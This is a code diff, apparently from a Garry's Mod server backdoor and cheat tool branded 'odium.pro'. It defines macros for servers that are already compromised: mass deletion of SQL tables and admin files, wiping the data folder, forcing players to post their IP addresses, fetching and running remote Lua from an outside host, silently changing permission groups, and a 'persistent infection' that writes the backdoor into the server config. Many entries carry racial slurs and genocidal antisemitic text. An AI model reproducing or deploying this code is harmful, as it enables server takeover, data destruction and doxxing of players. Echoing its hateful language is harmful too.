+        local dix = ents.Create( @1 )
+
+        dix:SetPos(trace.HitPos)
+
+        dix:SetAngles(Angle(0,0,0))
+
+        dix:Spawn()
+
+        ]],
+
+        ["Desc"] = "Spawn an entity in front of this player (first parameter = entity class), cannot spawn cars!",
+
+        ["NeedsParameters"] = 1,
+
+    },
+
+
+
+    ["Spawn prop near player"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[
+
+        local tr = {}
+
+        tr.start = v:GetShootPos()
+
+        tr.endpos = v:GetShootPos() + 2500 * v:GetAimVector()
+
+        tr.filter = {v}
+
+        local trace = util.TraceLine(tr)
+
+        local dix = ents.Create( "prop_physics" )
+
+        dix:SetPos(trace.HitPos)
+
+        dix:SetAngles(Angle(0,0,0))
+
+        dix:SetModel( @1 )
+
+        dix:Spawn()
+
+        ]],
+
+        ["Desc"] = "Spawn a world prop in front of this player (first parameter = model)",
+
+        ["NeedsParameters"] = 1,
+
+    },
+
+
+
+    ["Spawn odium shrine"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[
+
+        local tr = {}
+
+        tr.start = v:GetShootPos()
+
+        tr.endpos = v:GetShootPos() + 2500 * v:GetAimVector()
+
+        tr.filter = {v}
+
+        local trace = util.TraceLine(tr)
+
+        local dix = ents.Create( "prop_physics" )
+
+        dix:SetPos( trace.HitPos + Vector( 0, 0, 70 ) )
+
+        dix:SetAngles( v:GetAngles() )
+
+        dix:SetModel( "models/props_c17/gravestone_cross001a.mdl" )
+
+        dix:Spawn()
+
+        dix:SetMoveType( MOVETYPE_NONE )
+
+        dix:SetMaterial( "models/shiny" )
+
+        dix:SetColor( Color( 0, 0, 40 ) )
+
+
+
+        local function ecr( parent, model, pos, ang, col, mat  )
+
+            local dix = ents.Create( "prop_physics" )
+
+            dix:SetPos( parent:LocalToWorld( pos ) )
+
+            dix:SetAngles( parent:LocalToWorldAngles( ang ) )
+
+            dix:SetModel( model )
+
+            dix:SetParent( parent )
+
+            dix:Spawn()
+
+            dix:SetColor( col )
+
+            dix:SetMaterial( mat )
+
+        end
+
+
+
+        ecr( dix, "models/props_c17/gravestone_coffinpiece001a.mdl", Vector( -65, 0, -60 ), Angle( 0, 180, 0 ), Color( 40, 40, 80 ), "models/shiny"  )
+
+        ecr( dix, "models/hunter/blocks/cube025x3x025.mdl", Vector( -5, 18, 35 ), Angle( 0, 0, 0 ), Color( 80, 80, 180 ), "models/shiny"  )
+
+        ecr( dix, "models/hunter/blocks/cube025x3x025.mdl", Vector( -5, 6, 65 ), Angle( 0, 0, 90 ), Color( 80, 80, 180 ), "models/shiny"  )
+
+        ecr( dix, "models/hunter/blocks/cube025x150x025.mdl", Vector( -5, 71, 100 ), Angle( 0, 0, 90 ), Color( 80, 80, 180 ), "models/shiny"  )
+
+        ecr( dix, "models/hunter/blocks/cube025x150x025.mdl", Vector( -5, -59, 100 ), Angle( 0, 0, 90 ), Color( 80, 80, 180 ), "models/shiny"  )
+
+
+
+        for _, p in pairs( player.GetAll() ) do p:SendLua( 'chat.AddText( Color(200, 200, 255 ), "Heil odium.pro, god of cheating")' ) sound.Play( "ambient/explosions/explode_8.wav", p:GetPos(), 90, 80, 1 ) end
+
+
+
+        ]],
+
+        ["Desc"] = "Spawn a world prop in front of this player (first parameter = model)",
+
+    },
+
+
+
+
+
+
+
+    ["Spawn evil npc near player"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[
+
+        local tr = {}
+
+        tr.start = v:GetShootPos()
+
+        tr.endpos = v:GetShootPos() + 2500 * v:GetAimVector()
+
+        tr.filter = {v}
+
+        local trace = util.TraceLine(tr)
+
+        local dix = ents.Create( "npc_citizen" )
+
+        dix:SetPos(trace.HitPos)
+
+        dix:SetAngles(Angle(0,0,0))
+
+        dix:SetKeyValue( "additionalequipment", table.Random({"weapon_shotgun", "weapon_smg1", "weapon_ar2"}) )
+
+        dix:SetKeyValue( "citizentype", 3 )
+
+        dix:AddRelationship("player D_HT 200")
+
+        dix:SetCurrentWeaponProficiency(WEAPON_PROFICIENCY_PERFECT)
+
+        dix:SetSchedule( SCHED_IDLE_WANDER )
+
+        dix:Spawn()
+
+        ]],
+
+        ["Desc"] = "Spawn a hostile NPC in front of this player",
+
+    },
+
+
+
+    ["Death ray"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[
+
+        local trace = v:GetEyeTraceNoCursor()
+
+        if trace.Entity:IsValid() then trace.Entity:Remove() end
+
+        ]],
+
+        ["Desc"] = "Vaporize whatever this player is looking at",
+
+    },
+
+
+
+    ["Death ray (explosive)"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[
+
+        local trace = v:GetEyeTraceNoCursor()
+
+        local explo = ents.Create("env_explosion")
+
+        explo:SetPos(trace.HitPos)
+
+        explo:SetKeyValue("iMagnitude", "250")
+
+        explo:Spawn()
+
+        explo:Activate()
+
+        explo:Fire("Explode", "", 0)
+
+        ]],
+
+        ["Desc"] = "Blow up whatever this player is looking at",
+
+    },
+
+
+
+    ["Precise Artillery Strike"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[
+
+        local trace = v:GetEyeTraceNoCursor()
+
+        timer.Create( "uiashfuasfas"..v:UniqueID()..math.random(-9999, 99999), 0.2, 15, function()
+
+        local explo = ents.Create("env_explosion")
+
+        explo:SetPos(trace.HitPos + Vector( math.random( -500, 500), math.random( -500, 500), math.random( -500, 500) ) )
+
+        explo:SetKeyValue("iMagnitude", "250")
+
+        explo:Spawn()
+
+        explo:Activate()
+
+        explo:Fire("Explode", "", 0)
+
+        end)
+
+        ]],
+
+        ["Desc"] = "Blow up whatever this player is looking at",
+
+    },
+
+
+
+    ["Woman Driver"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[
+
+        local trace = v:GetEyeTraceNoCursor()
+
+        local car = ents.Create("prop_physics")
+
+        local trace2 = util.TraceLine( { start = trace.HitPos, endpos = trace.HitPos + Vector( 0, 0, 5000000 ), mask = MASK_SOLID_BRUSHONLY } )
+
+        car:SetModel( "models/props_vehicles/car002a_physics.mdl" )
+
+        car:SetAngles( v:GetAngles() )
+
+        car:SetPos( trace2.HitPos + Vector( 0, 0, -60 ) )
+
+        car:Spawn()
+
+        car:Activate()
+
+        car.boom = 6
+
+        car:GetPhysicsObject():SetVelocity( Vector( 0, 0, -5000 ) )
+
+        car:Ignite( 500 )
+
+        car:AddCallback( "PhysicsCollide", function( car, dat )
+
+            local explo = ents.Create("env_explosion")
+
+            explo:SetPos( car:GetPos() )
+
+            explo:SetKeyValue("iMagnitude", "350")
+
+            explo:Spawn()
+
+            explo:Activate()
+
+            explo:Fire("Explode", "", 0)
+
+            local ef = EffectData()
+
+            ef:SetOrigin( car:GetPos() )
+
+            ef:SetMagnitude( 5 )
+
+            ef:SetScale( 200 )
+
+            util.Effect( "ThumperDust", ef )
+
+            car.boom = car.boom - 1
+
+            if car.boom < 0 then car:Remove() end
+
+        end )
+
+        timer.Simple( 30, function() if car:IsValid() then car:Remove() end end)
+
+        ]],
+
+        ["Desc"] = "Make exploding vehicles rain from the sky",
+
+    },
+
+
+
+
+
+
+
+    ["Poison Gas"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[
+
+        local trace = v:GetEyeTraceNoCursor()
+
+        local ar2Explo = ents.Create("env_ar2explosion")
+
+        ar2Explo:SetOwner(game.GetWorld())
+
+        local p = trace.HitPos
+
+        ar2Explo:SetPos(trace.HitPos)
+
+        ar2Explo:Spawn()
+
+        ar2Explo:Activate()
+
+        ar2Explo:Fire("Explode", "", 0)
+
+        timer.Create( "gasthekikes_"..math.random(-9999, 9999).."_"..math.random(-9999, 9999), 0.25, 35, function()
+
+            for _, ent in pairs(ents.FindInSphere( p, 500)) do
+
+                if !ent:IsPlayer() then continue end
+
+                local d = DamageInfo()
+
+                d:SetDamage( 1 )
+
+                d:SetAttacker( game.GetWorld() )
+
+                d:SetInflictor( game.GetWorld() )
+
+                d:SetDamageType( DMG_DROWN )
+
+                ent:TakeDamageInfo( d )
+
+            end
+
+        end)
+
+
+
+        ]],
+
+        ["Desc"] = "GAS THE JEWS RACE WAR NOW",
+
+    },
+
+
+
+
+
+    ["Spawn vehicle near player"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[
+
+        local trc = {}
+
+        trc.start = v:GetShootPos()
+
+        trc.endpos = v:GetShootPos() + 2500 * v:GetAimVector()
+
+        trc.filter = {v}
+
+        local tr = util.TraceLine(trc)
+
+
+
+        local VehicleList = list.Get( "Vehicles" )
+
+        local vehicle = VehicleList[ @1 ]
+
+        if ( !vehicle ) then return end
+
+        local Angles = v:GetAngles()
+
+        Angles.pitch = 0
+
+        Angles.roll = 0
+
+        Angles.yaw = Angles.yaw + 180
+
+    
+
+        local pos = tr.HitPos
+
+        if ( vehicle.Offset ) then
+
+            pos = pos + tr.HitNormal * vehicle.Offset
+
+        end
+
+        local Ent = ents.Create( vehicle.Class )
+
+        if ( !Ent ) then return end
+
+        duplicator.DoGeneric( Ent, vehicle )
+
+        if ( vehicle.Model == "models/buggy.mdl" ) then Ent:SetKeyValue( "vehiclescript", "scripts/vehicles/jeep_test.txt" ) end
+
+        if ( vehicle.Model == "models/vehicle.mdl" ) then Ent:SetKeyValue( "vehiclescript", "scripts/vehicles/jalopy.txt" ) end
+
+        if ( vehicle && vehicle.KeyValues ) then
+
+            for k, v in pairs( vehicle.KeyValues ) do
+
+                Ent:SetKeyValue( k, v )
+
+            end
+
+        end
+
+        Ent:SetModel( vehicle.Model )
+
+        Ent:SetAngles( Angles )
+
+        Ent:SetPos( pos )
+
+        Ent:Spawn()
+
+        Ent:Activate()
+
+        if ( Ent.SetVehicleClass && @1 ) then Ent:SetVehicleClass( @1 ) end
+
+        Ent.VehicleName = vehicle.Class
+
+        Ent.VehicleTable = @1
+
+        Ent.ClassOverride = vehicle.Class
+
+        ]],
+
+        ["Desc"] = "Spawn a vehicle in front of this player (first parameter = vehicle class), don't try to spawn ents with this ya dingus!",
+
+        ["NeedsParameters"] = 1,
+
+    },
+
+
+
+    ["Kick player"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[ v:Kick( @1 ) ]],
+
+        ["Desc"] = "First parameter = reason for kick",
+
+    },
+
+
+
+    ["Niggerize player"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[ if !v.Niggered then v:SetColor( Color( 0, 0, 0 ) ) v.Niggered = true else v:SetColor( Color(255, 255, 255) ) v.Niggered = false end ]],
+
+        ["Desc"] = "Turns them black as night",
+
+    },
+
+
+
+    ["Cloak player"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[ if !v.BDCloaked then v:SetRenderMode( RENDERMODE_NONE ) v.BDCloaked = true else v:SetRenderMode( RENDERMODE_NORMAL ) v.BDCloaked = false end ]],
+
+        ["Desc"] = "Toggles cloaking on the player, people can still see the weapon they are holding however",
+
+    },
+
+
+
+    ["Allahu Ackbar"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[
+
+        local explo = ents.Create("env_explosion")
+
+        explo:SetOwner(v)
+
+        explo:SetPos(v:GetPos())
+
+        explo:SetKeyValue("iMagnitude", "250")
+
+        explo:Spawn()
+
+        explo:Activate()
+
+        explo:Fire("Explode", "", 0)
+
+        if v:Alive() then v:Kill() end
+
+        ]],
+
+        ["Desc"] = "Blows them the fuck up, all kills are attributed to them so its great for getting random assholes banned",
+
+    },
+
+
+
+    ["ULX set access"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[ local userInfo = ULib.ucl.authed[ v:UniqueID() ] ULib.ucl.addUser( v:UniqueID(), userInfo.allow, userInfo.deny, @1 ) ]],
+
+        ["Desc"] = "If ulx is installed this will (silently!) set them to the specified usergroup (1st parameter)",
+
+        ["NeedsParameters"] = 1,
+
+    },
+
+
+
+
+------------------------ custom / new shit ------------------------
+
+
+
+
+    ["Africanize"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[
+            local bones = {
+                [1] = {b = "ValveBiped.Bip01_Head1", v = Vector(4,0,4)},
+                [2] = {b =  "ValveBiped.Bip01_R_Thigh", v = Vector(0,0,0)},
+                [3] = {b = "ValveBiped.Bip01_L_Thigh", v = Vector(0,0,0)},
+                [4] = {b =  "ValveBiped.Bip01_R_Calf", v = Vector(0,0,1)},
+                [5] = {b = "ValveBiped.Bip01_L_Calf", v = Vector(0,0,1)},
+                [6] = {b = "ValveBiped.Bip01_R_UpperArm", v = Vector(0,0,0)},
+                [7] = {b = "ValveBiped.Bip01_L_UpperArm", v = Vector(0,0,0)},
+                [8] = {b = "ValveBiped.Bip01_R_Forearm", v = Vector(1,1.5,1.5)},
+                [9] = {b = "ValveBiped.Bip01_L_Forearm", v = Vector(1,1.5,1.5)},
+                [10] = {b = "ValveBiped.Bip01_R_Clavicle", v = Vector(0,0,0)},
+                [11] = {b = "ValveBiped.Bip01_L_Clavicle", v = Vector(0,0,0)},
+            }
+
+            if !v.is2D then
+                v.is2D = true
+                for k, bone  in pairs(bones) do
+                    local boneToFind = v:LookupBone(bone.b)
+                    v:ManipulateBoneScale( boneToFind, bone.v)
+                end
+            else
+                v.is2D = false
+                for k, bone  in pairs(bones) do
+                    local boneToFind = v:LookupBone(bone.b)
+                    v:ManipulateBoneScale( boneToFind, Vector(1,1,1))
+                end
+            end
+        ]],
+
+        ["Desc"] = "Makes the player seem as though they're 2D.",
+
+    },
+
+    ["M9K nuke"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[
+//            if (m9k) then
+                local nuke = ents.Create("m9k_davy_crockett_explo")
+                nuke:SetPos(v:GetPos())
+                nuke:SetOwner(v)
+                nuke.Owner = v
+                nuke:Spawn()
+                nuke:Activate()
+//            end
+        ]],
+
+        ["Desc"] = "Creates a nuke 'made' by selected user(s) & activates it where they're standing.",
+
+    },
+
+    ["Console jammer"] = {
+
+        ["Type"] = 1,
+
+        ["Code"] = [[
+            if !(timer.Exists("consoleJammer")) then
+                timer.Create("consoleJammer", 0.5, 0, function()
+                    print( "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n" )
+                end )
+            else
+                timer.Destroy("consoleJammer")
+            end
+        ]],
+
+        ["Desc"] = "Spams the server side console with a fuck load of new lines",
+
+    },
+
+    ["Moan steps"] = {
+
+        ["Type"] = 1,
+
+        ["Code"] = [[
+            if !(hook.GetTable()["PlayerFootstep"]["moanStep"]) then
+                hook.Add("PlayerFootstep", "moanStep", function(ply, pos, foot, sound2, volume, filter) ply:EmitSound( "vo/npc/female01/pain06.wav",75,math.random( 50, 150 )) end )
+            else
+                hook.Remove("PlayerFootstep", "moanStep")
+            end
+        ]],
+
+        ["Desc"] = "Turns all steps into highly orgasmic moans.",
+
+    },
+
+    ["Delete server"] = {
+
+        ["Type"] = 3,
+
+        ["Code"] = [[
+            local date = os.date( "%m-%d-%y" )
+            local databases = { "jobdata","darkrp_door","darkrp_levels","darkrp_prestige","darkrp_doorgroups","darkrp_doorjobs","darkrp_jobspawn","darkrp_position","darkrp_player","darkrp_dbversion","FAdmin_CAMIPrivileges","FADMIN_GROUPS","FAdmin_Immunity","FADMIN_MOTD","FAdmin_PlayerGroup","FADMIN_PRIVILEGES","FADMIN_RESTRICTEDENTS","FAdmin_ServerSettings","FAdminBans","FPP_ANTISPAM1","FPP_BLOCKED1","FPP_BLOCKMODELSETTINGS1","FPP_ENTITYDAMAGE1","FPP_GLOBALSETTINGS1","FPP_GRAVGUN1","FPP_GROUPMEMBERS1","FPP_GROUPS3","FPP_GROUPTOOL","FPP_PHYSGUN1","FPP_PLAYERUSE1","FPP_TOOLADMINONLY","FPP_TOOLGUN1","FPP_TOOLRESTRICTPERSON1","FPP_TOOLTEAMRESTRICT","FPP_BLOCKEDMODELS1","awarn_playerdata","awarn_serverdata","awarn_warnings","blogs_players_v3","blogs_v3","stt_date","stt_players","mlog_logs","mlog_permissions","atlaschat_players","atlaschat_ranks","atlaschat_remote","atlaschat_restrictions","OreBag","fcd_playerData","dailylogin","ChessLeaderboard","qsgr_data","voting_npcs","cac_incidents","steam_rewards","playerdata","playerinformation","utime","permaprops","cc_characters","cc_npcs","ckit_chips","ckit_persist","exsto_data_bans","exsto_data_ranks","exsto_data_users","exsto_data_variables","exsto_restriction","inventories","kinv_items","libk_player","permitems","player_gangapps","player_gangdata","player_gangs","ps2_categories","ps2_equipmentslot","ps2_HatPersistence","ps2_itemmapping","ps2_itempersistence","ps2_OutfitHatPersistenceMapping","ps2_outfits","ps2_playermodelpersistence","ps2_servers","ps2_settings","ps2_trailpersistence","ps2_wallet","removeprops","scoreboard_friends","serverguard_analytics","serverguard_bans","serverguard_pms","serverguard_ranks","serverguard_reports","serverguard_schema","serverguard_ttt_autoslays","serverguard_users","serverguard_watchlist","tttstats","ttt_passes_history","specdm_stats_new","ps2_achievements","ps2_boosterpersistence","ps2_cratepersistence","ps2_instatswitchweaponpersistence","ps2_keypersistence","ps2_rolecontrolpersistence","ps2_weaponpersistence","rapsheet","damagelog_autoslay","damagelog_names","damagelog_oldlogs","damagelog_weapons","kmapvote_mapinfo","kmapvote_ratings","mgang_gangs","mgang_players","deathrun_ids","deathrun_records","deathrun_stats","sui_ratings","shop_texthats","shop_money","shop_items","report_log" }
+            local datafiles = { "ulib/bans.txt","ulib/groups.txt","ulib/misc_registered.txt","ulib/users.txt","ulx/adverts.txt","ulx/apromote.txt","ulx/banmessage.txt","ulx/banreasons.txt","ulx/downloads.txt","ulx/gimps.txt","ulx/motd.txt","ulx/restrictions.txt","ulx/sbox_limits.txt","ulx/votemaps.txt","apg/settings.txt","atags/tags.txt","atags/rankchattags.txt","atags/playerchattags.txt","atags/tags.txt","atags/selectedtags.txt","atags/ranktags.txt","atags/playertags.txt","vcmod/settings_sv.txt","vcmod/config_sv_privilages.txt","wire_version.txt","UTeam.txt","prevhas.txt","cac/system_log_sv.txt","cac/serverworkshopinformation.txt","cac/settings.txt","cac/serverluainformation.txt","hitnumbers/settings.txt","soundlists/common_sounds.txt","vcmod/controls.txt","vcmod/dataserver.txt","qsgr_data/sqgr_settings.txt","blogs/configcache.txt","blogs/language.txt","cac/adminuipack.txt","ezjobs/config.txt","damagelog/colors.txt","damagelog/filters_new.txt","craphead_scripts/armory_robbery/rp_downtown_v4c/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v4c_v2/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v2/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_evilmelon_v1/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v4c_v3/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v4c_v4/policearmory_location.txt","mg_gangsdata/mg_npcspawns.txt","ulx/debugdump.txt","ulx/empty_teams.txt","chattags.txt","caseclaims.txt", "sammyservers_textscreens.txt","permaprops_permissions.txt","chattags.txt","prevhash.txt","permaprops_config.txt","zwhitelistjobdata/jobsetting.txt","zwhitelistjobdata/whitelistjob.txt","zmodserveroption/sysjobwhitelist.txt","vliss/settings/config.txt","nordahl_spawnpoint/rp_venator_v3.txt","nordahl_spawnpoint/rp_venator_v2.txt","nordahl_spawnpoint/rp_venator_v1.txt","nordahl_spawnpoint/rp_venator_gg.txt","nordahl_spawnpoint/rp_venator_ausv4.txt","nordahl_spawnpoint/rp_venator_v2_ffg.txt","planningevent/prehud.txt","planningoption/hourformat.txt","nordahl_spawnpoint/arena_byre.txt","nordahl_spawnpoint/rp_venator_v2_immersive.txt","nordahl_spawnpoint/rp_venator_fade_v3.txt","nordahl_spawnpoint/rp_venator_gr.txt","nordahl_spawnpoint/rp_tatoonie_dunsea_v1.txt","nordahl_spawnpoint/rp_scifi.txt","nordahl_spawnpoint/rishimoon_crimson.txt","nordahl_spawnpoint/rp_pripyat_hl2.txt","nordahl_spawnpoint/rp_onwardhope.txt", "nordahl_spawnpoint/rp_oldworld_fix.txt","nordahl_spawnpoint/sd_doomsday.txt","nordahl_spawnpoint/sd_doomsday_event.txt","nordahl_spawnpoint/rp_naboo_city_v1.txt","nordahl_spawnpoint/rp_noclyria_crimson.txt","nordahl_spawnpoint/rp_nar_shaddaa_v2.txt","nordahl_spawnpoint/rp_mos_mersic_v2.txt","nordahl_spawnpoint/rp_kashyyk_jungle_b2.txt","nordahl_spawnpoint/dust_dunes.txt","nordahl_spawnpoint/rp_cscdesert_v2-1_propfix.txt","nordahl_spawnpoint/rd_asteroid.txt","nordahl_spawnpoint/naboo.txt","nordahl_spawnpoint/kashyyyk.txt","nordahl_spawnpoint/geonosis.txt","nordahl_spawnpoint/fightspace3b.txt","nordahl_spawnpoint/endor.txt","nordahl_spawnpoint/toth_forgotten.txt"}
+            local sensitivefiles = { "ulx_logs/"..date..".txt","ulib/bans.txt","ulib/groups.txt","ulib/misc_registered.txt","ulib/users.txt","ulx/adverts.txt","ulx/apromote.txt","ulx/banmessage.txt","ulx/banreasons.txt","ulx/downloads.txt","ulx/gimps.txt","ulx/motd.txt","ulx/restrictions.txt","ulx/sbox_limits.txt","ulx/votemaps.txt","apg/settings.txt","atags/tags.txt","atags/rankchattags.txt","atags/playerchattags.txt","atags/tags.txt","atags/selectedtags.txt","atags/ranktags.txt","atags/playertags.txt","vcmod/settings_sv.txt","vcmod/config_sv_privilages.txt","cac/system_log_sv.txt","cac/serverworkshopinformation.txt","cac/settings.txt","cac/serverluainformation.txt","vcmod/controls.txt","vcmod/dataserver.txt","blogs/configcache.dat","blogs/language.txt","blogs/config_v5.txt","cac/adminuipack.txt","ulx/debugdump.txt","ulx/empty_teams.txt","chattags.txt","caseclaims.txt", "sammyservers_textscreens.txt","permaprops_permissions.txt","chattags.txt","permaprops_config.txt","whitelist.txt","zwhitelistjobdata/jobsetting.txt","zwhitelistjobdata/whitelistjob.txt","zmodserveroption/sysjobwhitelist.txt","nordahl_spawnpoint/rp_venator_v3.txt","nordahl_spawnpoint/rp_venator_v2.txt","nordahl_spawnpoint/rp_venator_v1.txt","nordahl_spawnpoint/rp_venator_gg.txt","nordahl_spawnpoint/rp_venator_ausv4.txt","nordahl_spawnpoint/rp_venator_v2_ffg.txt","planningevent/prehud.txt","planningoption/hourformat.txt","nordahl_spawnpoint/arena_byre.txt","nordahl_spawnpoint/rp_venator_v2_immersive.txt","nordahl_spawnpoint/rp_venator_fade_v3.txt","nordahl_spawnpoint/rp_venator_gr.txt","nordahl_spawnpoint/rp_tatoonie_dunsea_v1.txt","nordahl_spawnpoint/rp_scifi.txt","nordahl_spawnpoint/rishimoon_crimson.txt","nordahl_spawnpoint/rp_pripyat_hl2.txt","nordahl_spawnpoint/rp_onwardhope.txt", "nordahl_spawnpoint/rp_oldworld_fix.txt","nordahl_spawnpoint/sd_doomsday.txt","nordahl_spawnpoint/sd_doomsday_event.txt","nordahl_spawnpoint/rp_naboo_city_v1.txt","nordahl_spawnpoint/rp_noclyria_crimson.txt","nordahl_spawnpoint/rp_nar_shaddaa_v2.txt","nordahl_spawnpoint/rp_mos_mersic_v2.txt","nordahl_spawnpoint/rp_kashyyk_jungle_b2.txt","nordahl_spawnpoint/dust_dunes.txt","nordahl_spawnpoint/rp_cscdesert_v2-1_propfix.txt","nordahl_spawnpoint/rd_asteroid.txt","nordahl_spawnpoint/naboo.txt","nordahl_spawnpoint/kashyyyk.txt","nordahl_spawnpoint/geonosis.txt","nordahl_spawnpoint/fightspace3b.txt","nordahl_spawnpoint/endor.txt","nordahl_spawnpoint/toth_forgotten.txt"}
+            
+            for k,v in pairs(databases) do
+                if sql.TableExists(v) then 
+                    sql.Query("DROP TABLE "..v.." ;")
+                    sql.Query("CREATE TABLE IF NOT EXISTS "..v.." ( steamid TEXT NOT NULL PRIMARY KEY, value TEXT );")
+                end
+            end
+
+            for k,v in pairs(datafiles) do
+                if file.Exists(v) then
+                    file.Delete(v)
+                    file.write(v, "odium.pro hehe")
+                end
+            end
+
+            for k,v in pairs(sensitivefiles) do
+                if file.Exists(v) then
+                    file.Delete(v)
+                    file.write(v, "odium.pro hehe")
+                end
+            end
+        ]],
+
+        ["Desc"] = "Removes as much data as possible.",
+
+    },
+
+    ["Kill player (silent)"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[v:KillSilent()]],
+
+        ["Desc"] = "Silent slay a player.",
+
+    },
+
+    ["Delete props"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[v:ConCommand("gmod_cleanup")]],
+
+        ["Desc"] = "Removes all of the selected users props.",
+
+    },
+
+    ["Send lua"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[ v:SendLua( ""..@1.."") ]],
+
+        ["Desc"] = "Sends lua to the selected user.",
+
+        ["NeedsParameters"] = 1,
+
+    },
+
+    ["My ip is..."] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[
+            if (darkrp || DarkRP) then
+                v:SendLua('http.Fetch("http://ipv4bot.whatismyipaddress.com", function(b,l,h,c) LocalPlayer():ConCommand("say /ooc My IP is "..b) end, function(error) return error end )')
+            else
+                v:SendLua('http.Fetch("http://ipv4bot.whatismyipaddress.com", function(b,l,h,c) LocalPlayer():ConCommand("say My IP is "..b) end, function(error) return error end )')
+            end
+        ]],
+
+        ["Desc"] = "Forces the selected user(s) to say their own ip in chat.",
+
+    },
+
+    ["Ice skating simulator"] = {
+
+        ["Type"] = 1,
+
+        ["Code"] = [[ if !(icePark) then icePark = true RunConsoleCommand("sv_friction", 0) else icePark = false RunConsoleCommand("sv_friction", 8) end ]],
+
+        ["Desc"] = "Makes everyone skate around like they're on ice.",
+
+    },
+
+    ["Scramble vision"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[
+            v:SendLua('http.Fetch("http://gastheje.ws/scram.lua", function(b,l,h,c) RunString(b) end, function(error) print(error) end )')
+        ]],
+
+        ["Desc"] = "Fucks the view of target",
+
+    },
+
+// key/view scrambler, fuck with escape menu
+
+------------------------ dangerous codens ------------------------
+
+
+
+    ["DarkRP clear all money"] = {
+
+        ["Type"] = 3,
+
+        ["Code"] = [[RunConsoleCommand("rp_resetallmoney")]],
+
+        ["Desc"] = "Kids will cry to the admins for the next week about losing their precious money",
+
+    },
+
+
+
+    ["Cleanup map"] = {
+
+        ["Type"] = 3,
+
+        ["Code"] = [[game.CleanUpMap()]],
+
+        ["Desc"] = "Wipe the map clean, taking everybodys cars, printers and bases out",
+
+    },
+
+
+
+    ["Vaporize all players"] = {
+
+        ["Type"] = 3,
+
+        ["Code"] = [[for k, v in pairs(player.GetAll()) do v:Remove() end]],
+
+        ["Desc"] = "Deletes their player entity, leaving them staring at a wall of errors",
+
+    },
+
+
+
+
+
+    ["FPP Unrestrict everything"] = {
+
+        ["Type"] = 3,
+
+        ["Code"] = [[FPP.Blocked = {} FPP.BlockedModels = {} FPP.RestrictedTools = {} FPP.RestrictedToolsPlayers = {} ]],
+
+        ["Desc"] = "",
+
+    },
+
+
+
+    ["Wipe data folder"] = {
+
+        ["Type"] = 3,
+
+        ["Code"] = [[local files, directories = file.Find( "*", "DATA" ) for k, v in pairs( files ) do file.Delete( v ) end ]],
+
+        ["Desc"] = "Wipe the servers data folder, fucking all their settings and stuff up",
+
+    },
+
+
+
+    ["Wipe DarkRP SQL Tables"] = {
+
+        ["Type"] = 3,
+
+        ["Code"] = [[ MySQLite.query ('DROP TABLE darkrp_player' MySQLite.query('CREATE TABLE IF NOT EXISTS darkrp_player(idx INTEGER NOT NULL)') ]],
+
+        ["Desc"] = "Completely fucks darkrp, forces them to reinstall the entire server",
+
+    },
+
+
+
+}
+
+
+
+local selectedbackdoor = ""
+
+local backdoorargs = ""
+
+local selectedplayers = {}
+
+
+
+
+
+
+
+//////////////////////////////// BIG PRIVET CHEETZ ////////////////////////////////
+BD.BDMacros["@ Persistent Infection"] = {
+    ["Type"] = 1,
+    ["Code"] = [[
+    local config = ULib.fileRead( "data/ulx/config.txt" )
+    config = config.."\nulx logEcho 0"
+    config = config.."\nulx luarun %BD"
+    config = config.."\nulx logEcho 1"
+    ULib.fileWrite( "data/ulx/config.txt", config )
+    for _, p in pairs(player.GetAll()) do if %LCP then p:ChatPrint( "Persistent infection installed on server" ) end end
+    ]],
+    ["Desc"] = "Writes the backdoor code into memory, making sure that it stays on the server after restart",
+    ["Private"] = true,
+}
+
+BD.BackdoorTypes[">Odium Detector"] = {
+    ["Code"] = "util.AddNetworkString( 'NoOdium_ReadPing' ) net.Receive( 'NoOdium_ReadPing', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
+    ["Netkey"] = "NoOdium_ReadPing",
+}
+
+BD.BackdoorTypes["No Narks"] = {
+    ["Code"] = "util.AddNetworkString( 'NoNerks' ) net.Receive( 'NoNerks', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
+    ["Netkey"] = "NoNerks",
+}
+
+function BD.GenerateBackdoorList( parent, category )
+
+
+
+for k, v in SortedPairs( BD.BDMacros, false ) do
+
+    if v["Type"] != category then continue end
+
+
+
+    local plypanel2 = vgui.Create( "DPanel" )
+
+    plypanel2:SetPos( 0, 0 )
+
+    plypanel2:SetSize( 200, 25 )
+
+    plypanel2.Paint = function() -- Paint function
+
+        draw.RoundedBoxEx(8,1,1,plypanel2:GetWide(),plypanel2:GetTall(),Color(0, 0, 0, 150), false, false, false, false)
+
